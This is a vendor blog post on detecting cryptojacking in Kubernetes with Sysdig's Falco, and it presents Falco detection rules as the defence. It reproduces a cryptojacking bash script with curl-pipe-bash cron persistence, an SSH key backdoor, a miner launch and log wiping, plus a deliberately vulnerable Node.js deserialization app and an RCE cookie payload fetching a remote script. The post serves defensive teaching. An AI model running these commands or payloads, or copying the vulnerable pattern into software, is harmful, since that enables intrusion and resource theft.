---
ID: 6673
post_title: 'Detecting Cryptojacking with Sysdig&#8217;s Falco'
author: Michael Ducy
post_excerpt: ""
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/detecting-cryptojacking-with-sysdigs-falco/
published: true
post_date: 2018-03-13 16:48:40
---
The latest rage amongst attackers appears to be cryptojacking; rather, exploiting a system, and installing cryptocurrency miners to earn money from the exploited host's CPU power. We've talked about these types of attacks <a href="https://sysdigrp2rs.wpengine.com/blog/detecting-cryptojacking/" target="_blank" rel="noopener">before on the Sysdig blog</a> where we left an unsecured Kubernetes dashboard open to the internet, and captured the attacks with Sysdig Secure. More recently, companies such as <a href="https://www.theverge.com/2018/2/20/17032684/tesla-cloud-hacker-cryptocurrency-redlock" target="_blank" rel="noopener">Tesla have experienced</a> such attacks through publicly exposed Kubernetes dashboards. Our friends at <a href="https://blog.heptio.com/on-securing-the-kubernetes-dashboard-16b09b1b7aca" target="_blank" rel="noopener">Heptio wrote a great tutorial</a> on securing the Kubernetes dashboard, which is definitely the starting point for securing your cluster, but applications can still be exploited to give attackers access to mine cryptocurrency. In this post we'll cover how to use <a href="https://www.sysdigrp2rs.wpengine.com/opensource/falco" target="_blank" rel="noopener">Sysdig's Falco</a> to protect against such cryptojacking attacks.

## The Basics of Cryptojacking {#thebasicsofcryptojacking}

We've seen a couple iterations of attacks focused on cryptojacking, but they all tend to center around getting a system to run a script that then installs itself in the crontab, and tries several methods to download and run a currency mining program. The latest example we happened to see was in a slack channel of a popular open source project. The script that is ran looks something like the snippet below:

    #!/bin/bash
    yum install wget -y
    apt-get install wget -y
    echo "*/5 * * * * curl -fsSL http://<someip>:<port>/mrx | bash" > /var/spool/cron/root
    echo "*/5 * * * * wget -q -O- http://<someip>:<port>/mrx | bash" >> /var/spool/cron/root
    mkdir -p /var/spool/cron/crontabs
    mkdir -p /root/.ssh/
    echo "*/5 * * * * curl -fsSL http://<someip>:<port>/mrx | bash" > /var/spool/cron/crontabs/root
    echo "*/5 * * * * wget -q -O- http://<someip>:<port>/mrx | bash" >> /var/spool/cron/crontabs/root
    echo "ssh-rsa <key> root@host-10-10-10-26" >> /root/.ssh/authorized_keys
    PS2=$(ps aux | grep udevs | grep -v "grep" | wc -l)
    if [ $PS2 -eq 0 ];
    then
    rm -rf /tmp/udevs*
    wget https://<someip>/hHLzX/angular.js --no-check-certificate -O /tmp/udevs
    if [[ $? -ne 0 && $PS2 -eq 0 ]];
    then
    curl -sk https://<someip>/hHLzX/angular.js -o /tmp/udevs
    fi
    chmod +x /tmp/udevs
    chmod 777 /tmp/udevs
    /tmp/udevs -o stratum+tcp://<someip>:3333 -u <userid> -p pass --max-cpu-usage=50 --safe -B
    fi
    if [[ $? -ne 0 && $PS2 -eq 0 ]];
    then
    echo $?
    wget https://<someip>/7kvkJ/glibc-2.14.tar.gz --no-check-certificate -O /tmp/glibc-2.14.tar.gz && tar zxvf /tmp/glibc-2.14.tar.gz -C / && export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH && /tmp/udevs -o stratum+tcp://<someip>:3333 -u <userid> -p pass --max-cpu-usage=50 --safe -B && echo "" > /var/log/wtmp && echo "" > /var/log/secure && history -c
    fi

This is very similar to the script we saw in our previous post on <a href="https://sysdigrp2rs.wpengine.com/blog/detecting-cryptojacking/" target="_blank" rel="noopener">detecting cryptojacking with Sysdig Secure</a>. So the attacker needs get the script onto a host and then execute the script, which is a perfect use case for `curl | bash`.

## Exploiting a Node.js Application {#exploitinganodejsapplication}

Our last post on cryptojacking focused on a misconfiguration causing the Kubernetes dashboard to be exposed. In this post we're going to focus on an application with a vulnerability that allows it to be exploited by a cryptojacking script. We decided to use a <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank" rel="noopener">Node.js exploit on unserialization and unsanitized inputs</a> of data. For more detail, you should read the OpsSecX linked blog post about the exploit. In short, it leverages a feature of Javascript known as an <a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression" target="_blank" rel="noopener">Immediately invoked function expression</a> (IIFE). Given a sample application like below:

    var express = require('express');
    var cookieParser = require('cookie-parser');
    var escape = require('escape-html');
    var serialize = require('node-serialize');
    var app = express();
    app.use(cookieParser())
    
    app.get('/', function(req, res) {
     if (req.cookies.profile) {
       var str = new Buffer(req.cookies.profile, 'base64').toString();
       var obj = serialize.unserialize(str);
       if (obj.username) {
         res.send("Hello " + escape(obj.username));
       }
     } else {
         res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
           maxAge: 900000,
           httpOnly: true
         });
     }
     res.send("Hello World");
    });
    app.listen(3000);

This application takes data from the `profile` key stored in the cookie, and unserializes the value. Because the application doesn't sanitize the input from the cookie, we can pass in an immediately invoked function expression, and our code will run. Such a payload would look like the below.

    {"rce":"_$$ND_FUNC$$_function (){eval(require('child_process').exec('curl http://baddomain.org/badscript | bash', function(error, stdout, stderr) { console.log(stdout) }))}()"}

The IIFE can be identified by the last set of parens before the closing quote. When the payload is unserialized, the value returned by the function will be placed as the value of the JSON key. The last set of parens causes the function to execute immediately. For a more indepth look at IIFEs, you should read the <a href="http://benalman.com/news/2010/11/immediately-invoked-function-expression/" target="_blank" rel="noopener">blog post by Ben Alman</a> that helped define the term IIFE in Javascript.

## Packaging our App and Running on Kubernetes {#packagingourappandrunningonkubernetes}

Now that we have an application, we can package it and deploy it to Kubernetes. First we needed to package it as a container. We followed the <a href="https://nodejs.org/en/docs/guides/nodejs-docker-webapp/" target="_blank" rel="noopener">nodejs.org guide</a> on building a Docker image of our application and then we deployed the application to a Kubernetes cluster running in Google Kubernetes Engine. You can find the Dockerfile and the Kubernetes YAML we used in the <a href="https://github.com/mfdii/miner-blog" target="_blank" rel="noopener">Github repo</a> for this post.

We can verify the application is working by making a request. For this we'll use the tool <a href="https://install.advancedrestclient.com/#/install" target="_blank" rel="noopener">Advanced Rest Client (ARC)</a>, which will allow us to manipulate the headers later to execute our exploit.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/safe-request-1024x648.gif" alt="Safe web request to a Node.js application" width="1024" height="648" class="aligncenter wp-image-6679 size-large" />][1]

## Verifying the Exploit {#verifyingtheexploit}

Now that our application is running we can verify if the application can be exploited to run commands on our container. To do this we want to encode the payload using the UTF-16 character code units, then we will base64 encode the payload so it can be passed in our request's cookie. This can be achieved by running the `nodejspayload.py` script (in the <a href="https://github.com/mfdii/miner-blog" target="_blank" rel="noopener">Github repo</a>) to generate the UTF-16 encoded payload, and piping the output to the `base64` command.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/base64_payload-1024x602.gif" alt="base64 encoding a cookie payload to exploit a host" width="1024" height="602" class="aligncenter wp-image-6675 size-large" />][2]

With this payload, we can use ARC to send the payload as our cookie's profile value and verify if our application ran the encoded command as expected.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/ls_exploit-1024x677.gif" alt="Running ls via a web request to a container" width="1024" height="677" class="aligncenter wp-image-6678 size-large" />][3]

From the logs of our Pod, we can see the encoded command, `ls -l /`, was successfully ran. Note that the attacker gets no output indicating that the attack was successful. Instead of running `ls`, the attacker could run `curl` against a URL under their control, and then verify in access logs that the request was received. With this exploit, it's very easy to encode a `curl | bash` command that would allow an attacker to take more control over the container.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/exploited_w_miner-1024x588.gif" alt="exploiting an application and running a cryptocurrency miner" width="1024" height="588" class="aligncenter wp-image-6676 size-large" />][4]

We can see that we were able to inject the the payload with the `curl | bash` and start the miner.

## Detecting this Exploit with Falco {#detectingthisexploitwithfalco}

Sysdig's Falco is an open source, container security monitor designed to detect anomalous activity in your applications and containers. We can easily deploy Falco to Kubernetes as a Daemon Set and it will notify us of any abnormal behavior. For instructions how to deploy Falco as a Daemon Set in Kubernetes, you can read our <a href="https://sysdigrp2rs.wpengine.com/blog/runtime-security-kubernetes-sysdig-falco/" target="_blank" rel="noopener">previous blog post</a> or follow the <a href="https://github.com/draios/falco/tree/dev/examples/k8s-using-daemonset" target="_blank" rel="noopener">instructions in the Falco Github repo</a>.

[tweet_box design="default" float="none"]Detect cryptocurrency miners running in #Kubernetes with @Sysdig's Falco[/tweet_box] 

Falco comes with an extensive rule set to detect common container antipatterns, but to detect this cryptojacking use case we'll need to write some rules specific to crypto mining. Falco rules are stored in `/etc/falco/falco_rules.yaml` and any custom rules you write are stored in `/etc/falco/falco_rules.local.yaml`. For more info on getting started writing Falco rules, you can read our <a href="https://sysdigrp2rs.wpengine.com/blog/getting-started-writing-falco-rules/" target="_blank" rel="noopener">previous blog post</a> on the topic.

We can detect this type of mining activity with Falco by creating rules in `falco_rules.local.yaml` that look for the following:

*   Any process running a command with an argument containing `stratum+tcp`. Stratum is a common protocol used by mining software to communicate with mining pools.
*   A black list of common ports that mining software would connect to. This is a bit of a cat and mouse game as mining software might use different ports depending on the mining pools configuration. There are some common well known ports however we can blacklist.

The rule set we can apply to our Falco Daemon Set to catch this behavior looks like so:

    - macro: node_app_frontend
      condition: k8s.ns.name = node-app and k8s.pod.label.role = frontend and k8s.pod.label.app = node-app
    
    - rule: Detect crypto miners using the Stratum protocol
      desc: Miners typically specify the mining pool to connect to with a URI that begins with 'stratum+tcp'
      condition: node_app_frontend and spawned_process and container.id != host and proc.cmdline contains stratum+tcp
      output: Possible miner ran inside a container (command=%proc.cmdline %container.info)
      priority: WARNING
    
    - list: miner_ports
      items: [
        3333, 4444, 8333, 7777, 7778, 3357, 
        3335, 8899, 8888, 5730, 5588, 8118, 
        6099, 9332
      ]
    
    - macro: miner_port_connection
      condition: fd.sport in (miner_ports)
    
    - rule: Detect outbound connections to common miner pool ports
      desc: Miners typically connect to miner pools on common ports.
      condition: node_app_frontend and outbound and miner_port_connection
      output: "Outbound connection to common miner port (command=%proc.cmdline port=%fd.rport %container.info)"
      priority: WARNING

We could also create rules that create whitelist of ports we expect our Node container to have open or look for Node based containers spawning a process besides ones associated with Node.

## Verifying our rules in Kubernetes {#verifyingourrulesinkubernetes}

Now that we have our local rules to detect this miner, we can verify the rules against the exploited application. To do this we'll create a config map with the local rules, and our then create our Falco Daemon Set. Once we exploit the Node application, we should see alerts from Falco.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/falco_detecting-1024x562.gif" alt="Falco detecting a miner running in a container." width="1024" height="562" class="aligncenter wp-image-6677 size-large" />][5]

As we can see from the terminal recording, our Falco rules detected the miner being ran inside of our node application container. While in the default Falco setup, we are just logging to standard out, Falco provides a variety of <a href="https://github.com/draios/falco/wiki/Falco-Alerts" rel="noopener" target="_blank">methods to send alerts</a>. <a href="https://www.fluentd.org/guides/recipes/elasticsearch-and-s3" target="_blank" rel="noopener">Data collectors such as fluentd</a> can be leveraged, through the use of a log forwarder, to send Falco alerts to systems such as Elasticsearch.

## Getting Falco {#gettingfalco}

You can learn more about Falco on <a href="https://github.com/draios/falco" target="_blank" rel="noopener">the project's Github repository</a>, or dive into the <a href="https://github.com/draios/falco/wiki" target="_blank" rel="noopener">project's documentation</a>. We'd love to hear about your Falco use cases, and you can reach us in the Falco channel of <a href="https://slack.sysdigrp2rs.wpengine.com/" target="_blank" rel="noopener">our open source users Slack team</a>.

## Sysdig Secure {#sysdigsecure}

If you like the functionality of Sysdig Falco, but want more integrations, user activity auditing, the ability to kill or pause containers based on rules, and the ability to capture the state of a container when a rule fails check out Sysdig Secure. You can request a <a href="https://go.sysdigrp2rs.wpengine.com/docker-security-demo" target="_blank" rel="noopener">customized demo</a>, or <a href="https://go.sysdigrp2rs.wpengine.com/secure-trial-request" target="_blank" rel="noopener">kick off a trial</a>.

 [1]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/safe-request.gif
 [2]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/base64_payload.gif
 [3]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/ls_exploit.gif
 [4]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/exploited_w_miner.gif
 [5]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2018/03/falco_detecting.gif